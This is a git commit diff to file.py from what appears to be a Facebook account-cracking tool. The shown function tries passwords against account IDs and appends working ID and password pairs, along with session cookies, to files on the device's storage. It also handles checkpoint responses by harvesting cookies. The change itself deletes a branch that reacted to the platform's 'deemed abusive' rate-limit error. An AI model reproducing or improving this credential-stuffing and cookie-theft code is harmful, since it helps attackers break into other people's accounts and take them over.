769a9068bdab1fa78bb18192e1c62289cec858f1
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2024-07-21 20:22:20 +0530

    Update file.py

--- file.py
+++ file.py
@@ -858,9 +858,6 @@ def m1(ids,pwv):
                         open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')                        
                         oks.append(cid)
                         break
-            elif 'The action attempted has been deemed abusive' in po.get('error', {}).get('message', ''):
-                sys.stdout.write(f"\r{rad}[{green}{animasi}-M1{rad}]{white}-{rad}[\033[38;5;196m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
-                sys.stdout.flush()
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
